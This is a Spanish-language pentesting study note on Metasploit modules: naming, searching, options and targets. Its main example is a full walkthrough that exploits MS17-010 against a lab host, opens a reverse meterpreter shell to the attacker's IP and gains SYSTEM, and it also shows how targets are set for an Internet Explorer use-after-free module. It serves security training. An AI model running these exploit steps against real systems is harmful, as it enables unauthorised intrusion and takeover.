---
tags:
  - Linux
  - Pentesting
Fecha de actualización: 2025-11-13
Nota previa: "[[👨‍💻 MSFconsole]]"
Nota siguiente: "[[Payloads]]"
Area: "[[Ⓜ️🧨 Metasploit]]"
---
---

Como mencionamos anteriormente, los módulos de [[Ⓜ️🧨 Metasploit]] son <mark style="background: #ADCCFFA6;">scripts preparados con un propósito específico y funciones correspondientes que ya han sido desarrollados y probados</mark>. La categoría `exploit` consiste en la llamada **prueba de concepto** (`POCs`) que puede <mark style="background: #FFB86CA6;">utilizarse para explotar vulnerabilidades existentes de una manera en gran medida automatizada</mark>. Muchos exploits <mark style="background: #FFB8EBA6;">requieren personalización según los hosts de destino para que el exploit funcione</mark>. Por lo tanto, las herramientas automatizadas como el marco *Metasploit* **sólo deben considerarse una herramienta de apoyo y no un sustituto de nuestras habilidades** manuales.

Una vez que estemos en el [[👨‍💻 MSFconsole]], podemos seleccionar de una lista extensa que contiene todos los módulos *Metasploit* disponibles. Cada uno de ellos está estructurado en carpetas, que se verán así:
```shell-session
<No.> <type>/<os>/<service>/<name>
```
- **Índice No.**: la etiqueta `No.` se mostrará para <mark style="background: #ADCCFFA6;">seleccionar el exploit que queremos después durante nuestras búsquedas.</mark> Se puede utilizar para <mark style="background: #8000E1A6;">seleccionar módulos *Metasploit* específicos</mark>.
- **Tipo**: la etiqueta `Type` es el primer nivel de segregación entre *Metasploit* `modules`. Al observar este campo, podemos saber <mark style="background: #FFB86CA6;">qué logrará el fragmento de código de este módulo</mark>. Algunos de estos `types` no se pueden utilizar directamente como `exploit`. Sin embargo, se prevé que introduzcan la estructura junto con las interactuables para una mejor modularización.
- **Sistema operativo**: la etiqueta `OS` <mark style="background: #ADCCFFA6;">especifica para qué sistema operativo y arquitectura se creó el módulo</mark>. Naturalmente, diferentes sistemas operativos requieren que se ejecute código diferente para obtener los resultados deseados.
- **Servicio**: la etiqueta `Service` se refiere al <mark style="background: #ADCCFFA6;">servicio vulnerable que se está ejecutando en la máquina de destino</mark>. Para algunos módulos, como el `auxiliary` o `post`, esta etiqueta <mark style="background: #FFB8EBA6;">puede referirse a una actividad más general</mark> como `gather`, refiriéndose a la recopilación de credenciales, por ejemplo.
- **Nombre**: el tag `Name` explica la <mark style="background: #ADCCFFA6;">acción real que se puede realizar utilizando este módulo</mark> creado para un <mark style="background: #FFB86CA6;">propósito específico</mark>.
> [!example]+
> `794   exploit/windows/ftp/scriptftp_list`

Algunos tipos para el campo `Types`:

| **Tipo**    | **Descripción**                                                                                                        |
| ----------- | ---------------------------------------------------------------------------------------------------------------------- |
| `Auxiliary` | Capacidades de escaneo, fuzzing, sniffing y administración. Ofrece asistencia y funcionalidad adicionales.             |
| `Encoders`  | Asegurarse de que los *payloads* estén intactos hasta su destino.                                                      |
| `Exploits`  | Definidos como módulos que explotan una vulnerabilidad que permitirá la entrega del *payload*.                         |
| `NOPs`      | (**Sin código de operación**) Mantener los tamaños de *payloads* consistentes en todos los intentos de explotación.    |
| `Payloads`  | El código se ejecuta de forma remota y vuelve a llamar a la máquina atacante para establecer una conexión (o *shell*). |
| `Plugins`   | Se pueden integrar scripts adicionales dentro de una evaluación con `msfconsole` y coexistir.                          |
| `Post`      | Amplia gama de módulos para recopilar información, pivotar más profundamente, etc.                                     |
> [!attention]+
> Al seleccionar un módulo para usar en la entrega de *payload*, el comando `use <no.>` **solo se puede utilizar con los siguientes módulos** que se pueden utilizar como `initiators` (o módulos interactuables): `Auxiliary`, `Exploits` y `Post`.

---

# Buscando módulos
*Metasploit* también ofrece una **función de búsqueda** bien desarrollada para los módulos existentes. Con la ayuda de esta función, podemos buscar rápidamente en todos los módulos utilizando módulos específicos `tags` para encontrar uno adecuado para nuestro objetivo.

## MSF - Función de búsqueda
```shell-session
msf6 > help search

Usage: search [<options>] [<keywords>:<value>]

Prepending a value with '-' will exclude any matching results.
If no options or keywords are provided, cached results are displayed.

OPTIONS:
  -h                   Show this help information
  -o <file>            Send output to a file in csv format
  -S <string>          Regex pattern used to filter search results
  -u                   Use module if there is one result
  -s <search_column>   Sort the research results based on <search_column> in ascending order
  -r                   Reverse the search results order to descending order

Keywords:
  aka              :  Modules with a matching AKA (also-known-as) name
  author           :  Modules written by this author
  arch             :  Modules affecting this architecture
  bid              :  Modules with a matching Bugtraq ID
  cve              :  Modules with a matching CVE ID
  edb              :  Modules with a matching Exploit-DB ID
  check            :  Modules that support the 'check' method
  date             :  Modules with a matching disclosure date
  description      :  Modules with a matching description
  fullname         :  Modules with a matching full name
  mod_time         :  Modules with a matching modification date
  name             :  Modules with a matching descriptive name
  path             :  Modules with a matching path
  platform         :  Modules affecting this platform
  port             :  Modules with a matching port
  rank             :  Modules with a matching rank (Can be descriptive (ex: 'good') or numeric with comparison operators (ex: 'gte400'))
  ref              :  Modules with a matching ref
  reference        :  Modules with a matching reference
  target           :  Modules affecting this target
  type             :  Modules of a specific type (exploit, payload, auxiliary, encoder, evasion, post, or nop)

Supported search columns:
  rank             :  Sort modules by their exploitabilty rank
  date             :  Sort modules by their disclosure date. Alias for disclosure_date
  disclosure_date  :  Sort modules by their disclosure date
  name             :  Sort modules by their name
  type             :  Sort modules by their type
  check            :  Sort modules by whether or not they have a check method

Examples:
  search cve:2009 type:exploit
  search cve:2009 type:exploit platform:-linux
  search cve:2009 -s name
  search type:exploit -s type -r
```

## MSF - En busca de un módulo
```shell-session
msf6 > search eternalromance

Matching Modules
================

   #  Name                                  Disclosure Date  Rank    Check  Description
   -  ----                                  ---------------  ----    -----  -----------
   0  exploit/windows/smb/ms17_010_psexec   2017-03-14       normal  Yes    MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Code Execution
   1  auxiliary/admin/smb/ms17_010_command  2017-03-14       normal  No     MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Command Execution



msf6 > search eternalromance type:exploit

Matching Modules
================

   #  Name                                  Disclosure Date  Rank    Check  Description
   -  ----                                  ---------------  ----    -----  -----------
   0  exploit/windows/smb/ms17_010_psexec   2017-03-14       normal  Yes    MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Code Execution
```

## MSF - Búsqueda específica
Podemos hacer nuestra **búsqueda un poco más aproximada y reducirla a una categoría de servicios**. Por ejemplo, para el *CVE*, podríamos especificar el año (`cve:<year>`), la plataforma *Windows* (`platform:<os>`), el tipo de módulo que queremos encontrar (`type:<auxiliary/exploit/post>`), el rango de confiabilidad (`rank:<rank>`), y el nombre de búsqueda (`<pattern>`). Esto <mark style="background: #8000E1A6;">reduciría nuestros resultados sólo a aquellos que coincidan con todo lo anterior</mark>.
```shell-session
msf6 > search type:exploit platform:windows cve:2021 rank:excellent microsoft

Matching Modules
================

   #  Name                                            Disclosure Date  Rank       Check  Description
   -  ----                                            ---------------  ----       -----  -----------
   0  exploit/windows/http/exchange_proxylogon_rce    2021-03-02       excellent  Yes    Microsoft Exchange ProxyLogon RCE
   1  exploit/windows/http/exchange_proxyshell_rce    2021-04-06       excellent  Yes    Microsoft Exchange ProxyShell RCE
   2  exploit/windows/http/sharepoint_unsafe_control  2021-05-11       excellent  Yes    Microsoft SharePoint Unsafe Control and ViewState RCE
```

---

# Uso de módulos
Dentro de los módulos interactivos **hay varias opciones que podemos especificar**. Estos se utilizan para adaptar el módulo *Metasploit* al entorno dado. Para comprobar qué opciones deben configurarse antes de poder enviar el exploit al host de destino, podemos utilizar el comando `show options`. Todo lo que sea necesario configurar antes de que pueda ocurrir la explotación tendrá un `Yes` bajo la columna `Required`.

## MSF - Seleccionar módulo
Ahora <mark style="background: #FFB86CA6;">no tenemos que escribir la ruta completa sino sólo el número asignado al módulo</mark> *Metasploit* en nuestra búsqueda.
```shell-session
<SNIP>

Matching Modules
================

   #  Name                                  Disclosure Date  Rank    Check  Description
   -  ----                                  ---------------  ----    -----  -----------
   0  exploit/windows/smb/ms17_010_psexec   2017-03-14       normal  Yes    MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Code Execution
   1  auxiliary/admin/smb/ms17_010_command  2017-03-14       normal  No     MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Command Execution
   
   
msf6 > use 0
msf6 exploit(windows/smb/ms17_010_psexec) > options

Module options (exploit/windows/smb/ms17_010_psexec): 

   Name                  Current Setting                          Required  Description
   ----                  ---------------                          --------  -----------
   DBGTRACE              false                                    yes       Show extra debug trace info
   LEAKATTEMPTS          99                                       yes       How many times to try to leak transaction
   NAMEDPIPE                                                      no        A named pipe that can be connected to (leave blank for auto)
   NAMED_PIPES           /usr/share/metasploit-framework/data/wo  yes       List of named pipes to check
                         rdlists/named_pipes.txt
   RHOSTS                                                         yes       The target host(s), see https://github.com/rapid7/metasploit-framework
                                                                            /wiki/Using-Metasploit
   RPORT                 445                                      yes       The Target port (TCP)
   SERVICE_DESCRIPTION                                            no        Service description to to be used on target for pretty listing
   SERVICE_DISPLAY_NAME                                           no        The service display name
   SERVICE_NAME                                                   no        The service name
   SHARE                 ADMIN$                                   yes       The share to connect to, can be an admin share (ADMIN$,C$,...) or a no
                                                                            rmal read/write folder share
   SMBDomain             .                                        no        The Windows domain to use for authentication
   SMBPass                                                        no        The password for the specified username
   SMBUser                                                        no        The username to authenticate as


Payload options (windows/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  thread           yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST                      yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Automatic
```

## MSF - Información del módulo
Podemos usar el comando `info` después de seleccionar el módulo si queremos saber algo más sobre el módulo. Esto **nos dará una serie de información que puede ser importante para nosotros**.
```shell-session
msf6 exploit(windows/smb/ms17_010_psexec) > info

       Name: MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Code Execution
     Module: exploit/windows/smb/ms17_010_psexec
   Platform: Windows
       Arch: x86, x64
 Privileged: No
    License: Metasploit Framework License (BSD)
       Rank: Normal
  Disclosed: 2017-03-14

Provided by:
  sleepya
  zerosum0x0
  Shadow Brokers
  Equation Group

Available targets:
  Id  Name
  --  ----
  0   Automatic
  1   PowerShell
  2   Native upload
  3   MOF upload

Check supported:
  Yes

Basic options:
  Name                  Current Setting                          Required  Description
  ----                  ---------------                          --------  -----------
  DBGTRACE              false                                    yes       Show extra debug trace info
  LEAKATTEMPTS          99                                       yes       How many times to try to leak transaction
  NAMEDPIPE                                                      no        A named pipe that can be connected to (leave blank for auto)
  NAMED_PIPES           /usr/share/metasploit-framework/data/wo  yes       List of named pipes to check
                        rdlists/named_pipes.txt
  RHOSTS                                                         yes       The target host(s), see https://github.com/rapid7/metasploit-framework/
                                                                           wiki/Using-Metasploit
  RPORT                 445                                      yes       The Target port (TCP)
  SERVICE_DESCRIPTION                                            no        Service description to to be used on target for pretty listing
  SERVICE_DISPLAY_NAME                                           no        The service display name
  SERVICE_NAME                                                   no        The service name
  SHARE                 ADMIN$                                   yes       The share to connect to, can be an admin share (ADMIN$,C$,...) or a nor
                                                                           mal read/write folder share
  SMBDomain             .                                        no        The Windows domain to use for authentication
  SMBPass                                                        no        The password for the specified username
  SMBUser                                                        no        The username to authenticate as

Payload information:
  Space: 3072

Description:
  This module will exploit SMB with vulnerabilities in MS17-010 to 
  achieve a write-what-where primitive. This will then be used to 
  overwrite the connection session information with as an 
  Administrator session. From there, the normal psexec payload code 
  execution is done. Exploits a type confusion between Transaction and 
  WriteAndX requests and a race condition in Transaction requests, as 
  seen in the EternalRomance, EternalChampion, and EternalSynergy 
  exploits. This exploit chain is more reliable than the EternalBlue 
  exploit, but requires a named pipe.

References:
  https://docs.microsoft.com/en-us/security-updates/SecurityBulletins/2017/MS17-010
  https://nvd.nist.gov/vuln/detail/CVE-2017-0143
  https://nvd.nist.gov/vuln/detail/CVE-2017-0146
  https://nvd.nist.gov/vuln/detail/CVE-2017-0147
  https://github.com/worawit/MS17-010
  https://hitcon.org/2017/CMT/slide-files/d2_s2_r0.pdf
  https://blogs.technet.microsoft.com/srd/2017/06/29/eternal-champion-exploit-analysis/

Also known as:
  ETERNALSYNERGY
  ETERNALROMANCE
  ETERNALCHAMPION
  ETERNALBLUE
```

## MSF - Especificación de destino
Una vez que estemos satisfechos de que el módulo seleccionado es el correcto, **debemos establecer algunas especificaciones para personalizar el módulo y usarlo con éxito contra nuestro host de destino**, como configurar el destino (`RHOST` o `RHOSTS`).
```shell-session
msf6 exploit(windows/smb/ms17_010_psexec) > set RHOSTS 10.10.10.40

RHOSTS => 10.10.10.40


msf6 exploit(windows/smb/ms17_010_psexec) > options

   Name                  Current Setting                          Required  Description
   ----                  ---------------                          --------  -----------
   DBGTRACE              false                                    yes       Show extra debug trace info
   LEAKATTEMPTS          99                                       yes       How many times to try to leak transaction
   NAMEDPIPE                                                      no        A named pipe that can be connected to (leave blank for auto)
   NAMED_PIPES           /usr/share/metasploit-framework/data/wo  yes       List of named pipes to check
                         rdlists/named_pipes.txt
   RHOSTS                10.10.10.40                              yes       The target host(s), see https://github.com/rapid7/metasploit-framework
                                                                            /wiki/Using-Metasploit
   RPORT                 445                                      yes       The Target port (TCP)
   SERVICE_DESCRIPTION                                            no        Service description to to be used on target for pretty listing
   SERVICE_DISPLAY_NAME                                           no        The service display name
   SERVICE_NAME                                                   no        The service name
   SHARE                 ADMIN$                                   yes       The share to connect to, can be an admin share (ADMIN$,C$,...) or a no
                                                                            rmal read/write folder share
   SMBDomain             .                                        no        The Windows domain to use for authentication
   SMBPass                                                        no        The password for the specified username
   SMBUser                                                        no        The username to authenticate as


Payload options (windows/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  thread           yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST                      yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Automatic
```
> [!info]+
> Además, existe la opción `setg`, que **especifica las opciones seleccionadas por nosotros como permanentes hasta que se reinicie el programa**. Por lo tanto, si estamos trabajando en un host de destino en particular, <mark style="background: #FFB8EBA6;">podemos usar este comando para establecer la dirección *IP* una vez y no cambiarla nuevamente hasta que cambiemos nuestro enfoque</mark> a una dirección *IP* diferente: `setg RHOSTS 10.10.10.40`

## Especificación MSF - LHOST
En el caso que vayamos a utilizar una [[Reverse shell]] basada en *TCP* <mark style="background: #ADCCFFA6;">necesitamos especificar a qué dirección *IP* debe conectarse para poder establecer una conexión</mark>. Por lo tanto, necesitamos establecer `LHOST` <mark style="background: #8000E1A6;">a nuestra propia dirección *IP*</mark> de la siguiente manera:
```shell-session
msf6 exploit(windows/smb/ms17_010_psexec) > setg LHOST 10.10.14.15

LHOSTS => 10.10.14.15
```

## MSF - Ejecución de exploits
Una vez que todo esté listo y preparado para funcionar, podemos proceder a lanzar el ataque.
```shell-session
msf6 exploit(windows/smb/ms17_010_psexec) > run

[*] Started reverse TCP handler on 10.10.14.15:4444 
[*] 10.10.10.40:445 - Using auxiliary/scanner/smb/smb_ms17_010 as check
[+] 10.10.10.40:445       - Host is likely VULNERABLE to MS17-010! - Windows 7 Professional 7601 Service Pack 1 x64 (64-bit)
[*] 10.10.10.40:445       - Scanned 1 of 1 hosts (100% complete)
[*] 10.10.10.40:445 - Connecting to target for exploitation.
[+] 10.10.10.40:445 - Connection established for exploitation.
[+] 10.10.10.40:445 - Target OS selected valid for OS indicated by SMB reply
[*] 10.10.10.40:445 - CORE raw buffer dump (42 bytes)
[*] 10.10.10.40:445 - 0x00000000  57 69 6e 64 6f 77 73 20 37 20 50 72 6f 66 65 73  Windows 7 Profes
[*] 10.10.10.40:445 - 0x00000010  73 69 6f 6e 61 6c 20 37 36 30 31 20 53 65 72 76  sional 7601 Serv
[*] 10.10.10.40:445 - 0x00000020  69 63 65 20 50 61 63 6b 20 31                    ice Pack 1      
[+] 10.10.10.40:445 - Target arch selected valid for arch indicated by DCE/RPC reply
[*] 10.10.10.40:445 - Trying exploit with 12 Groom Allocations.
[*] 10.10.10.40:445 - Sending all but last fragment of exploit packet
[*] 10.10.10.40:445 - Starting non-paged pool grooming
[+] 10.10.10.40:445 - Sending SMBv2 buffers
[+] 10.10.10.40:445 - Closing SMBv1 connection creating free hole adjacent to SMBv2 buffer.
[*] 10.10.10.40:445 - Sending final SMBv2 buffers.
[*] 10.10.10.40:445 - Sending last fragment of exploit packet!
[*] 10.10.10.40:445 - Receiving response from exploit packet
[+] 10.10.10.40:445 - ETERNALBLUE overwrite completed successfully (0xC000000D)!
[*] 10.10.10.40:445 - Sending egg to corrupted connection.
[*] 10.10.10.40:445 - Triggering free of corrupted buffer.
[*] Command shell session 1 opened (10.10.14.15:4444 -> 10.10.10.40:49158) at 2020-08-13 21:37:21 +0000
[+] 10.10.10.40:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
[+] 10.10.10.40:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-WIN-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
[+] 10.10.10.40:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=


meterpreter> shell

C:\Windows\system32>
```

## MSF - Interacción objetivo
Ahora **tenemos un *shell* en la máquina de destino y podemos interactuar con él**.
```shell-session
C:\Windows\system32> whoami

whoami
nt authority\system
```

---

# Objetivos
`Targets` son identificadores únicos del sistema operativo tomados de las versiones de esos sistemas operativos específicos que adaptan el módulo de explotación seleccionado para ejecutarse en esa versión particular del sistema operativo. El `show targets` El comando emitido dentro de una vista de módulo de explotación mostrará todos los objetivos vulnerables disponibles para esa explotación específica, mientras que emitir el mismo comando en el menú raíz, fuera de cualquier módulo de explotación seleccionado, nos permitirá saber que primero debemos seleccionar un módulo de explotación.

## Mostrar objetivos
```shell-session
msf6 > show targets

[-] No exploit module selected.
```

Al observar nuestro módulo de explotación anterior, esto sería lo que vemos:
```shell-session
msf6 exploit(windows/smb/ms17_010_psexec) > options

   Name                  Current Setting                          Required  Description
   ----                  ---------------                          --------  -----------
   DBGTRACE              false                                    yes       Show extra debug trace info
   LEAKATTEMPTS          99                                       yes       How many times to try to leak transaction
   NAMEDPIPE                                                      no        A named pipe that can be connected to (leave blank for auto)
   NAMED_PIPES           /usr/share/metasploit-framework/data/wo  yes       List of named pipes to check
                         rdlists/named_pipes.txt
   RHOSTS                10.10.10.40                              yes       The target host(s), see https://github.com/rapid7/metasploit-framework
                                                                            /wiki/Using-Metasploit
   RPORT                 445                                      yes       The Target port (TCP)
   SERVICE_DESCRIPTION                                            no        Service description to to be used on target for pretty listing
   SERVICE_DISPLAY_NAME                                           no        The service display name
   SERVICE_NAME                                                   no        The service name
   SHARE                 ADMIN$                                   yes       The share to connect to, can be an admin share (ADMIN$,C$,...) or a no
                                                                            rmal read/write folder share
   SMBDomain             .                                        no        The Windows domain to use for authentication
   SMBPass                                                        no        The password for the specified username
   SMBUser                                                        no        The username to authenticate as


Payload options (windows/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  thread           yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST                      yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Automatic
```

## Seleccionar un objetivo
Podemos ver que solo hay un tipo general de objetivo establecido para este tipo de explotación. ¿Qué pasa si cambiamos el módulo de explotación a algo que necesita rangos de objetivos más específicos? El siguiente exploit tiene como objetivo:
- `MS12-063 Microsoft Internet Explorer execCommand Use-After-Free Vulnerability`.

Si queremos saber más sobre este módulo específico y cuál es la vulnerabilidad detrás de él, podemos usar el `info` comando. Este comando puede ayudarnos siempre que no estemos seguros sobre los orígenes o la funcionalidad de diferentes exploits o módulos auxiliares. Teniendo en cuenta que siempre se considera la mejor práctica auditar nuestro código para detectar cualquier generación de artefactos o "características adicionales", `info` El comando debe ser uno de los primeros pasos que damos cuando utilizamos un nuevo módulo. De esta manera, podemos familiarizarnos con la funcionalidad del exploit y al mismo tiempo garantizar un entorno de trabajo seguro y limpio tanto para nuestros clientes como para nosotros.
```shell-session
msf6 exploit(windows/browser/ie_execcommand_uaf) > info

       Name: MS12-063 Microsoft Internet Explorer execCommand Use-After-Free Vulnerability 
     Module: exploit/windows/browser/ie_execcommand_uaf
   Platform: Windows
       Arch: 
 Privileged: No
    License: Metasploit Framework License (BSD)
       Rank: Good
  Disclosed: 2012-09-14

Provided by:
  unknown
  eromang
  binjo
  sinn3r <sinn3r@metasploit.com>
  juan vazquez <juan.vazquez@metasploit.com>

Available targets:
  Id  Name
  --  ----
  0   Automatic
  1   IE 7 on Windows XP SP3
  2   IE 8 on Windows XP SP3
  3   IE 7 on Windows Vista
  4   IE 8 on Windows Vista
  5   IE 8 on Windows 7
  6   IE 9 on Windows 7

Check supported:
  No

Basic options:
  Name       Current Setting  Required  Description
  ----       ---------------  --------  -----------
  OBFUSCATE  false            no        Enable JavaScript obfuscation
  SRVHOST    0.0.0.0          yes       The local host to listen on. This must be an address on the local machine or 0.0.0.0
  SRVPORT    8080             yes       The local port to listen on.
  SSL        false            no        Negotiate SSL for incoming connections
  SSLCert                     no        Path to a custom SSL certificate (default is randomly generated)
  URIPATH                     no        The URI to use for this exploit (default is random)

Payload information:

Description:
  This module exploits a vulnerability found in Microsoft Internet 
  Explorer (MSIE). When rendering an HTML page, the CMshtmlEd object 
  gets deleted in an unexpected manner, but the same memory is reused 
  again later in the CMshtmlEd::Exec() function, leading to a 
  use-after-free condition. Please note that this vulnerability has 
  been exploited since Sep 14, 2012. Also, note that 
  presently, this module has some target dependencies for the ROP 
  chain to be valid. For WinXP SP3 with IE8, msvcrt must be present 
  (as it is by default). For Vista or Win7 with IE8, or Win7 with IE9, 
  JRE 1.6.x or below must be installed (which is often the case).

References:
  https://cvedetails.com/cve/CVE-2012-4969/
  OSVDB (85532)
  https://docs.microsoft.com/en-us/security-updates/SecurityBulletins/2012/MS12-063
  http://technet.microsoft.com/en-us/security/advisory/2757760
  http://eromang.zataz.com/2012/09/16/zero-day-season-is-really-not-over-yet/
```

Mirando la descripción, podemos tener una idea general de lo que este exploit logrará para nosotros. Teniendo esto en cuenta, a continuación nos gustaría comprobar qué versiones son vulnerables a este exploit.
```shell-session
msf6 exploit(windows/browser/ie_execcommand_uaf) > options

Module options (exploit/windows/browser/ie_execcommand_uaf):

   Name       Current Setting  Required  Description
   ----       ---------------  --------  -----------
   OBFUSCATE  false            no        Enable JavaScript obfuscation
   SRVHOST    0.0.0.0          yes       The local host to listen on. This must be an address on the local machine or 0.0.0.0
   SRVPORT    8080             yes       The local port to listen on.
   SSL        false            no        Negotiate SSL for incoming connections
   SSLCert                     no        Path to a custom SSL certificate (default is randomly generated)
   URIPATH                     no        The URI to use for this exploit (default is random)


Exploit target:

   Id  Name
   --  ----
   0   Automatic


msf6 exploit(windows/browser/ie_execcommand_uaf) > show targets

Exploit targets:

   Id  Name
   --  ----
   0   Automatic
   1   IE 7 on Windows XP SP3
   2   IE 8 on Windows XP SP3
   3   IE 7 on Windows Vista
   4   IE 8 on Windows Vista
   5   IE 8 on Windows 7
   6   IE 9 on Windows 7
```

Vemos opciones tanto para diferentes versiones de Internet Explorer como para varias versiones de Windows. Dejando la selección a `Automatic` le permitirá a msfconsole saber que necesita realizar una detección de servicio en el objetivo determinado antes de lanzar un ataque exitoso.

Sin embargo, si sabemos qué versiones se están ejecutando en nuestro objetivo, podemos usar el `set target <index no.>` comando para elegir un objetivo de la lista.
```shell-session
msf6 exploit(windows/browser/ie_execcommand_uaf) > show targets

Exploit targets:

   Id  Name
   --  ----
   0   Automatic
   1   IE 7 on Windows XP SP3
   2   IE 8 on Windows XP SP3
   3   IE 7 on Windows Vista
   4   IE 8 on Windows Vista
   5   IE 8 on Windows 7
   6   IE 9 on Windows 7


msf6 exploit(windows/browser/ie_execcommand_uaf) > set target 6

target => 6
```

## Tipos de objetivos
Existe una gran variedad de tipos de objetivos. Cada objetivo puede variar de otro según el paquete de servicios, la versión del sistema operativo e incluso la versión del idioma. Todo depende de la dirección de retorno y otros parámetros en el destino o dentro del módulo de explotación.

La dirección de retorno puede variar porque un paquete de idioma en particular cambia de dirección, hay una versión de software diferente disponible o las direcciones se cambian debido a ganchos. Todo está determinado por el tipo de dirección de retorno necesaria para identificar el objetivo. Esta dirección puede ser `jmp esp`, un salto a un registro específico que identifica el objetivo, o un `pop/pop/ret`. Para obtener más información sobre el tema de las direcciones de retorno, consulte el [Desbordamientos de búfer basados en pila en Windows x86](https://academy.hackthebox.com/module/89/section/931) módulo. Los comentarios en el código del módulo de explotación pueden ayudarnos a determinar por qué está definido el objetivo.

Para identificar un objetivo correctamente, necesitaremos:
- Obtenga una copia de los binarios de destino
- Utilice msfpescan para localizar una dirección de retorno adecuada.